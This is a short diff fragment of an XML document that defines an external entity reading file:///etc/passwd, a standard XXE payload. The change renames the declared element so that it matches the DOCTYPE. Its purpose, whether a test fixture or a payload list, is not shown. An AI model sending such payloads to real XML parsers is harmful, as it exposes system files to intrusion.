@@ -2,7 +2,7 @@
 
 <!DOCTYPE data [
 
-<!ELEMENT name ANY>
+<!ELEMENT data ANY>
 
 <!ENTITY data SYSTEM "file:///etc/passwd">]>
 
